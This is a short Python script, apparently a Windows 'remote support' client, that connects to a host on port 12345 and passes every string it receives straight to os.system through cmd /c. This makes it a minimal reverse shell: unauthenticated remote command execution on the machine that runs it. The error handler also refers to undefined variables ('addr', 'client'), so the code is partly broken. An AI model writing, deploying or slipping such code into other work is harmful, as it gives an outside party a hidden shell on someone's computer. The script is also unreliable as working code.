import socket
import os

#host = '127.0.0.1'#LA IP DEL EQUIPO AL QUE SE DA SOPORTE
host = socket.gethostname()
port = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


print("Established connection to: ", host, ":", port)
s.connect((host,port))

while True:
    try:
        data = s.recv(1024)
        print("Executed: ",data.decode())
        os.system('cmd /c' + data.decode())
        os.system('exit')
    except:
        print("Disconnected from : ", addr)
        s.close()
        client.close()

s.close()
client.close()
